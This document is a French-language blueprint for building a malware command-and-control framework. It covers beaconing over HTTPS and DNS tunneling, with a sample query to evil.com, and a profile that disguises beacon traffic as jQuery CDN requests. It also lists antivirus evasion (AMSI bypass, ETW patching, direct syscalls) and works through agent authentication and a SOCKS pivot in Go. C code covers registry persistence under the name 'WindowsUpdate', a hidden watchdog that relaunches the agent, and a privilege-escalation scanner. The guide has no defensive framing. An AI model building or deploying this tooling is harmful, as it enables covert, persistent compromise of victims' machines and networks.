# Guide Architecture C2 Complète

## Table des matières
1. [Protocoles de communication](#protocoles-de-communication)
2. [Types d'obfuscation](#types-dobfuscation)
3. [Gestion des accès & authentification](#gestion-des-accès--authentification)
4. [Évasion antivirus](#évasion-antivirus)
5. [Exécution de commandes](#exécution-de-commandes)
6. [Tunneling & communication sécurisée](#tunneling--communication-sécurisée)
7. [Persistence & survie](#persistence--survie)
8. [Scan de vulnérabilités](#scan-de-vulnérabilités)
9. [Architecture décentralisée](#architecture-décentralisée)
10. [Intégration VPN](#intégration-vpn)

---

## Protocoles de communication

### Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────┐
│                 PROTOCOLES C2 DISPONIBLES                   │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  COUCHE APPLICATION                                         │
│  ├── HTTP/HTTPS (le plus commun)                           │
│  ├── DNS (très discret)                                    │
│  ├── WebSocket (temps réel)                                │
│  ├── ICMP (ping tunneling)                                 │
│  └── SMB (mouvement latéral)                                 │
│                                                              │
│  COUCHE TRANSPORT                                           │
│  ├── TCP (fiable)                                          │
│  ├── UDP (rapide, moins fiable)                            │
│  └── Raw sockets                                           │
│                                                              │
│  SERVICES TIERS                                             │
│  ├── Slack/Discord/Telegram (API bots)                     │
│  ├── Twitter/X (tweets cachés)                             │
│  ├── Google Sheets (données)                               │
│  ├── Dropbox/OneDrive (fichiers)                           │
│  └── Cloud Functions (serverless)                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### HTTP/HTTPS (recommandé)

```
┌─────────────────────────────────────────────────────────────┐
│                         HTTP C2                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Avantages:                                                 │
│  ✅ Passe les firewalls (port 80/443)                       │
│  ✅ Se fond dans le trafic normal                           │
│  ✅ Facile à implémenter                                    │
│  ✅ Supporte le chiffrement TLS                             │
│  ✅ Profils malléables (ressemble à du trafic légitime)    │
│                                                              │
│  Inconvénients:                                             │
│  ⚠️ Polling (pas temps réel)                               │
│  ⚠️ Peut être inspecté par proxy SSL                       │
│                                                              │
│  Exemple de requête:                                        │
│  GET /api/update?v=3.2.1&id=abc123 HTTP/1.1                │
│  Host: cdn.legit-site.com                                   │
│  Cookie: session=<données chiffrées>                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### DNS Tunneling (très discret)

```
┌─────────────────────────────────────────────────────────────┐
│                        DNS C2                               │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Avantages:                                                 │
│  ✅ Traverse presque tous les réseaux                       │
│  ✅ Rarement inspecté en profondeur                         │
│  ✅ Difficile à bloquer (casse internet)                    │
│                                                              │
│  Inconvénients:                                             │
│  ⚠️ Très lent                                              │
│  ⚠️ Limité en taille (253 chars par requête)               │
│  ⚠️ Détectable par analyse DNS                             │
│                                                              │
│  Exemple:                                                   │
│  Requête: SGVsbG8gV29ybGQ.data.evil.com (base64 in subdomain)│
│  Réponse: TXT record avec données encodées                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### WebSocket (temps réel)

```
┌─────────────────────────────────────────────────────────────┐
│                     WEBSOCKET C2                            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Avantages:                                                 │
│  ✅ Connexion persistante                                   │
│  ✅ Bi-directionnel temps réel                              │
│  ✅ Moins de overhead que HTTP polling                      │
│                                                              │
│  Inconvénients:                                             │
│  ⚠️ Connexion persistante = plus visible                   │
│  ⚠️ Moins de proxies le supportent                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Tableau comparatif

| Protocole | Discrétion | Vitesse | Complexité | Usage |
|-----------|------------|---------|------------|-------|
| **HTTPS** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | Principal |
| **DNS** | ⭐⭐⭐⭐⭐ | ⭐ | ⭐⭐⭐⭐ | Backup/exfil |
| **WebSocket** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ | Temps réel |
| **ICMP** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | Restrictif |
| **Slack/Discord** | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ | Alternatif |

---

## Types d'obfuscation

### Catégories d'obfuscation

```
┌─────────────────────────────────────────────────────────────┐
│                    TYPES D'OBFUSCATION                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. OBFUSCATION DU CODE (Anti-reverse)                      │
│     - Renommer variables/fonctions                          │
│     - Control flow (switch/goto)                            │
│     - Dead code insertion                                   │
│     - Opaque predicates                                     │
│                                                             │
│  2. OBFUSCATION DES DONNÉES (Anti-analyse statique)         │
│     - Chiffrement des strings                               │
│     - Stack strings                                         │
│     - Encoding (base64, rot13)                              │
│                                                             │
│  3. OBFUSCATION RÉSEAU (Anti-détection trafic)              │
│     - Domain fronting                                       │
│     - Profils malléables (ressembler à trafic légitime)     │
│     - Jitter (timing aléatoire)                             │
│     - Padding (taille aléatoire)                            │
│                                                             │
│  4. OBFUSCATION COMPORTEMENTALE (Anti-sandbox)              │
│     - Délai d'exécution                                     │
│     - Détection environnement                               │
│     - Exécution conditionnelle                              │
│                                                             │
│  5. OBFUSCATION MÉMOIRE (Anti-dump)                         │
│     - Sleep encryption                                      │
│     - Guard pages                                           │
│     - Self-modifying code                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Obfuscation réseau - Profils malléables

```yaml
# Exemple: Faire ressembler le trafic à du jQuery CDN
name: "jquery-cdn"
http:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  
  beacon:
    uri: 
      - "/jquery-3.6.0.min.js"
      - "/jquery-ui.min.js"
    headers:
      Accept: "application/javascript"
      Referer: "https://www.google.com/"
    transform:
      prepend: "/*! jQuery v3.6.0 | (c) OpenJS Foundation */\n"
      append: "\n//# sourceMappingURL=jquery.min.map"
      
  response:
    headers:
      Content-Type: "application/javascript"
      Cache-Control: "max-age=31536000"
```

---

## Gestion des accès & authentification

### Architecture d'authentification

```
┌─────────────────────────────────────────────────────────────┐
│                 AUTHENTIFICATION MULTI-COUCHES              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  COUCHE 1: Clé de compilation (Build Key)                   │
│  ──────────────────────────────────────────                 │
│  Chaque build a une clé unique compilée dans l'agent        │
│  Si quelqu'un reverse l'agent → une seule clé compromise    │
│                                                             │
│  COUCHE 2: Agent ID unique                                  │
│  ─────────────────────────────                              │
│  UUID généré au premier lancement                           │
│  Stocké dans registry/fichier caché                         │
│                                                             │
│  COUCHE 3: Challenge-Response                               │
│  ───────────────────────────────                            │
│  Serveur envoie un challenge aléatoire                      │
│  Agent répond avec HMAC(challenge, PSK)                     │
│  Empêche le replay                                          │
│                                                             │
│  COUCHE 4: Certificat client (mTLS)                         │
│  ─────────────────────────────────                          │
│  Chaque agent a son propre certificat                       │
│  Le serveur valide avant d'accepter                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Implémentation

```go
// Côté serveur - Validation d'un agent
func ValidateAgent(r *http.Request) (*Agent, error) {
    // 1. Vérifier le Build Key
    buildKey := r.Header.Get("X-Build-Key")
    if !isValidBuildKey(buildKey) {
        return nil, errors.New("invalid build key")
    }
    
    // 2. Vérifier l'Agent ID
    agentID := r.Header.Get("X-Agent-ID")
    agent, exists := getAgent(agentID)
    if !exists {
        // Nouvel agent - enregistrer
        agent = registerNewAgent(agentID, buildKey)
    }
    
    // 3. Vérifier le challenge-response
    challenge := agent.CurrentChallenge
    response := r.Header.Get("X-Challenge-Response")
    expected := hmacSHA256(challenge, agent.PSK)
    if !hmac.Equal([]byte(response), expected) {
        return nil, errors.New("invalid challenge response")
    }
    
    // 4. Générer nouveau challenge pour la prochaine fois
    agent.CurrentChallenge = generateRandomChallenge()
    
    return agent, nil
}
```

### Kill Switch & Révocation

```
┌─────────────────────────────────────────────────────────────┐
│                        KILL SWITCH                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Si un agent est compromis/analysé:                         │
│                                                             │
│  1. RÉVOQUER côté serveur                                   │
│     - Ajouter l'Agent ID à la blacklist                     │
│     - Révoquer le Build Key                                 │
│     - Révoquer le certificat client                         │
│                                                             │
│  2. AUTODESTRUCTION                                         │
│     - Envoyer commande "self-destruct"                      │
│     - L'agent supprime ses fichiers                         │
│     - L'agent se termine                                    │
│                                                             │
│  3. ROTATION DES CLÉS                                       │
│     - Changer la clé de chiffrement                         │
│     - Les anciens agents ne peuvent plus communiquer        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Évasion antivirus

### Stratégie multicouche

```
┌─────────────────────────────────────────────────────────────┐
│                     STRATÉGIE ANTI-AV                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  COMPILATION                                                │
│  - Pas de packer (entropy normale)                          │
│  - Strings chiffrées                                        │
│  - Polymorphisme (chaque build unique)                      │
│  - Signature si possible                                    │
│                                                             │
│  EXÉCUTION                                                  │
│  - Syscalls directs (bypass hooks)                          │
│  - Sleep obfuscation                                        │
│  - ETW patching                                             │
│  - AMSI bypass                                              │
│                                                             │
│  COMPORTEMENT                                               │
│  - Délai avant exécution (anti-sandbox)                     │
│  - Actions légitimes mélangées                              │
│  - Injection dans process trusted                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Exécution de commandes

### Types de commandes

```
┌─────────────────────────────────────────────────────────────┐
│                     TYPES DE COMMANDES                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SHELL                                                      │
│  - cmd.exe /c <command>                                     │
│  - powershell.exe -c <command>                              │
│  - /bin/bash -c <command>                                   │
│                                                             │
│  API DIRECTE (plus discret)                                 │
│  - CreateProcess()                                          │
│  - Appels API système directs                               │
│  - Pas de shell intermédiaire                               │
│                                                             │
│  IN-MEMORY                                                  │
│  - Charger un module en mémoire                             │
│  - BOF (Beacon Object Files)                                │
│  - .NET Assembly.Load()                                     │
│                                                             │
│  INJECTION                                                  │
│  - Injecter dans un autre process                           │
│  - Exécuter dans le contexte d'un process trusted           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Architecture de la queue de tâches

```
┌─────────────────────────────────────────────────────────────┐
│                       QUEUE DE TÂCHES                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SERVEUR                                                    │
│  ┌─────────────────────────────────────────┐                │
│  │  Task Queue (par agent)                 │                │
│  │  ├── Agent-1: [task1, task2, task3]     │                │
│  │  ├── Agent-2: [task1]                   │                │
│  │  └── Agent-3: []                        │                │
│  └─────────────────────────────────────────┘                │
│                                                             │
│  FLUX:                                                      │
│  1. Opérateur envoie commande via UI/API                    │
│  2. Serveur ajoute à la queue de l'agent                    │
│  3. Agent beacon → récupère ses tâches                      │
│  4. Agent exécute → retourne les résultats                  │
│  5. Serveur marque la tâche comme complétée                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Tunneling & communication sécurisée

### Chiffrement des communications

```
┌─────────────────────────────────────────────────────────────┐
│                   COMMUNICATION SÉCURISÉE                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ÉTAPE 1: Key Exchange (première connexion)                 │
│  ──────────────────────────────────────────                 │
│  Agent ─── génère keypair RSA/ECDH ───►                     │
│  Agent ◄── reçoit clé publique serveur                      │
│  Agent ─── envoie sa clé publique (chiffrée) ───►           │
│  Agent ◄── reçoit clé de session AES                        │
│                                                             │
│  ÉTAPE 2: Communication chiffrée                            │
│  ───────────────────────────────────                        │
│  Toutes les communications en AES-256-GCM                   │
│  Avec la clé de session                                     │
│  + HMAC pour l'intégrité                                    │
│                                                             │
│  ÉTAPE 3: Rotation périodique                               │
│  ─────────────────────────────                              │
│  Changer la clé de session régulièrement                    │
│  Si une clé est compromise → impact limité                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Types de tunnels

| Tunnel | Usage | Avantage |
|--------|-------|----------|
| **SOCKS proxy** | Tunnel TCP générique | Flexible |
| **Port forward** | Un port spécifique | Simple |
| **VPN** | Tout le trafic réseau | Complet |
| **SSH tunnel** | Tunnel chiffré | Natif sur Linux |

### Implémentation tunnel SOCKS

```
┌─────────────────────────────────────────────────────────────┐
│                    SOCKS PROXY VIA AGENT                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  OPÉRATEUR                 AGENT                CIBLE       │
│  ─────────                 ─────                ─────       │
│  Browser ──► localhost:1080                                 │
│              │                                              │
│              └──► [tunnel C2] ──► Agent                     │
│                                      │                      │
│                                      └──► Réseau interne    │
│                                            │                │
│                                            └──► 192.168.x.x │
│                                                             │
│  Le browser de l'opérateur accède au réseau interne         │
│  via l'agent comme proxy SOCKS                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Persistence & survie

### Mécanismes de persistence Windows

```
┌─────────────────────────────────────────────────────────────┐
│                     PERSISTENCE WINDOWS                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  CLASSIQUES (détectés facilement)                           │
│  - Run keys (HKCU/HKLM\...\Run)                             │
│  - Scheduled Tasks                                          │
│  - Services                                                 │
│  - Startup folder                                           │
│                                                             │
│  DISCRETS                                                   │
│  - COM Hijacking                                            │
│  - AppInit_DLLs                                             │
│  - WMI Event Subscription                                   │
│  - DLL Search Order Hijacking                               │
│  - Image File Execution Options                             │
│                                                             │
│  AVANCÉS                                                    │
│  - Bootkit (UEFI/BIOS)                                      │
│  - Hypervisor                                               │
│  - Firmware                                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Survie au reboot

```c
// Persistence Registry
void install_persistence() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);
    
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ,
        (BYTE*)path, strlen(path) + 1);
    
    RegCloseKey(hKey);
}
```

### Survie au kill process (Watchdog)

```
┌─────────────────────────────────────────────────────────────┐
│                 WATCHDOG / GUARDIAN PROCESS                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  MÉTHODE 1: Deux processus qui se surveillent               │
│  ──────────────────────────────────────────                 │
│  Process A surveille B                                      │
│  Process B surveille A                                      │
│  Si l'un meurt → l'autre le relance                        │
│                                                              │
│  MÉTHODE 2: WMI Event Subscription                         │
│  ────────────────────────────────────                       │
│  Événement: "Process XYZ s'est terminé"                     │
│  Action: "Relancer process XYZ"                             │
│  Survit au reboot                                           │
│                                                              │
│  MÉTHODE 3: Service Recovery                                │
│  ──────────────────────────────                             │
│  Configurer le service pour restart on failure              │
│  sc failure myservice reset= 0 actions= restart/1000        │
│                                                              │
│  MÉTHODE 4: Scheduled Task au boot                          │
│  ─────────────────────────────────                          │
│  Task qui vérifie si le process tourne                      │
│  Sinon le relance                                           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Code Watchdog

```c
// Watchdog qui relance l'agent si tué
void watchdog_thread() {
    while (1) {
        if (!is_process_running("agent.exe")) {
            // Relancer
            ShellExecute(NULL, "open", "C:\\path\\agent.exe",
                NULL, NULL, SW_HIDE);
        }
        Sleep(5000);  // Check toutes les 5 secondes
    }
}
```

---

## Scan de vulnérabilités

### Reconnaissance automatique

```
┌─────────────────────────────────────────────────────────────┐
│                      RECON AUTOMATIQUE                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  À L'ENREGISTREMENT:                                        │
│  - OS version & patches                                     │
│  - User & privileges                                        │
│  - Network info (IP, domain)                               │
│  - Antivirus détecté                                        │
│  - Process en cours                                         │
│                                                              │
│  PRIVESC CHECKS:                                            │
│  - SeImpersonatePrivilege ?                                │
│  - Services vulnérables ?                                  │
│  - Unquoted paths ?                                        │
│  - AlwaysInstallElevated ?                                 │
│  - Credentials en clair ?                                  │
│                                                              │
│  Le résultat est envoyé au serveur automatiquement         │
│  Le dashboard affiche les vulnérabilités trouvées          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Module de scan intégré

```c
typedef struct {
    char* name;
    char* description;
    int severity;  // 1-10
    char* remediation;
} Vulnerability;

Vulnerability* scan_privesc() {
    Vulnerability* vulns = malloc(sizeof(Vulnerability) * 10);
    int count = 0;
    
    // Check SeImpersonate
    if (has_privilege(SE_IMPERSONATE_NAME)) {
        vulns[count++] = (Vulnerability){
            .name = "SeImpersonatePrivilege",
            .description = "Token impersonation possible (Potato attacks)",
            .severity = 9,
            .remediation = "Use JuicyPotato/PrintSpoofer"
        };
    }
    
    // Check unquoted paths
    SERVICES* svcs = get_unquoted_services();
    if (svcs->count > 0) {
        vulns[count++] = (Vulnerability){
            .name = "Unquoted Service Paths",
            .description = "N services with unquoted paths",
            .severity = 7,
            .remediation = "Plant executable in path"
        };
    }
    
    // ... autres checks
    
    return vulns;
}
```

---

## Architecture décentralisée

### Gestion individuelle des agents

```
┌─────────────────────────────────────────────────────────────┐
│                  ARCHITECTURE MULTI-AGENTS                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  DASHBOARD                                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐            │   │
│  │  │ Agent-1 │  │ Agent-2 │  │ Agent-3 │            │   │
│  │  │ Win10   │  │ Server  │  │ Linux   │            │   │
│  │  │ User    │  │ SYSTEM  │  │ root    │            │   │
│  │  │ 🟢Onln  │  │ 🔴Dead  │  │ 🟡Sleep │            │   │
│  │  └─────────┘  └─────────┘  └─────────┘            │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
│  CHAQUE AGENT A:                                            │
│  - Son propre ID unique                                     │
│  - Sa propre clé de session                                 │
│  - Sa propre queue de tâches                                │
│  - Son propre historique                                    │
│  - Son propre status                                        │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Database schema

```sql
-- Agents
CREATE TABLE agents (
    id UUID PRIMARY KEY,
    hostname VARCHAR(255),
    username VARCHAR(255),
    os_version VARCHAR(255),
    ip_internal VARCHAR(45),
    ip_external VARCHAR(45),
    first_seen TIMESTAMP,
    last_seen TIMESTAMP,
    status VARCHAR(50),  -- online, offline, dead
    session_key BYTEA,
    build_id VARCHAR(255)
);

-- Tasks
CREATE TABLE tasks (
    id UUID PRIMARY KEY,
    agent_id UUID REFERENCES agents(id),
    command_type VARCHAR(50),
    command_data TEXT,
    status VARCHAR(50),  -- pending, running, completed, failed
    created_at TIMESTAMP,
    completed_at TIMESTAMP,
    result TEXT
);
```

### Groupes d'agents

```
┌─────────────────────────────────────────────────────────────┐
│                      GROUPES D'AGENTS                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Par OS:                                                    │
│  - Windows 10 Workstations                                 │
│  - Windows Servers                                         │
│  - Linux                                                    │
│                                                              │
│  Par privilège:                                             │
│  - SYSTEM / root                                            │
│  - Admin                                                    │
│  - User                                                     │
│                                                              │
│  Par réseau:                                                │
│  - Domain Controllers                                      │
│  - DMZ                                                      │
│  - Internal                                                 │
│                                                              │
│  Actions sur groupe:                                        │
│  - Envoyer commande à tous                                  │
│  - Mettre à jour tous                                       │
│  - Kill tous                                                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Intégration VPN

### Options VPN

```
┌─────────────────────────────────────────────────────────────┐
│                         OPTIONS VPN                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. VPN CLASSIQUE (OpenVPN, WireGuard)                     │
│     - L'agent établit un tunnel VPN                         │
│     - L'opérateur accède au réseau via VPN                  │
│     - Nécessite des drivers (détectable)                    │
│                                                              │
│  2. SOCKS PROXY                                             │
│     - Plus léger qu'un VPN                                  │
│     - Pas besoin de drivers                                 │
│     - Fonctionne au niveau application                      │
│                                                              │
│  3. REVERSE PORT FORWARD                                    │
│     - L'agent forward un port vers l'opérateur              │
│     - Simple et efficace                                    │
│     - Un port à la fois                                     │
│                                                              │
│  4. DOUBLE HOP                                              │
│     - Agent 1 → Agent 2 → Cible                            │
│     - Cache l'origine                                       │
│     - Compliqué à tracer                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Implémentation SOCKS via agent

```go
// Serveur SOCKS5 côté operateur
func startSOCKSProxy(port int, agentID string) {
    listener, _ := net.Listen("tcp", fmt.Sprintf(":%d", port))
    
    for {
        conn, _ := listener.Accept()
        go handleSOCKS(conn, agentID)
    }
}

func handleSOCKS(conn net.Conn, agentID string) {
    // 1. Parse SOCKS5 handshake
    // 2. Get destination
    // 3. Forward via agent
    task := Task{
        Type: "socks_connect",
        Data: destination,
    }
    response := sendToAgent(agentID, task)
    
    // 4. Relay data bidirectionnellement
    go io.Copy(conn, response)
    io.Copy(response, conn)
}
```

---

## Résumé

### Checklist implémentation C2

```
[ ] Protocoles: HTTP/HTTPS + DNS backup
[ ] Chiffrement: AES-GCM + key exchange RSA/ECDH
[ ] Auth: Build key + Agent ID + Challenge-response
[ ] Anti-AV: Syscalls directs + sleep obfuscation
[ ] Persistence: Registry + Watchdog
[ ] Survie: Dual process + auto-restart
[ ] Tunneling: SOCKS proxy intégré
[ ] Recon: Scan privesc automatique
[ ] Dashboard: Gestion individuelle agents
[ ] Kill switch: Révocation à distance
```

### Architecture recommandée

```
┌─────────────────────────────────────────────────────────────┐
│                    ARCHITECTURE FINALE                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  OPÉRATEUR                                                  │
│  ├── Web Dashboard (React)                                  │
│  └── CLI Console                                            │
│          │                                                  │
│          ▼                                                  │
│  TEAMSERVER (Go)                                            │
│  ├── API REST                                               │
│  ├── Session Manager                                        │
│  ├── Task Queue                                             │
│  ├── SOCKS Proxy                                            │
│  └── Listeners (HTTP, DNS, ...)                             │
│          │                                                  │
│          ▼ (chiffré, authentifié)                           │
│  AGENTS (C)                                                 │
│  ├── Beacon module                                          │
│  ├── Task executor                                          │
│  ├── Recon module                                           │
│  ├── Persistence                                            │
│  └── Evasion layer                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```
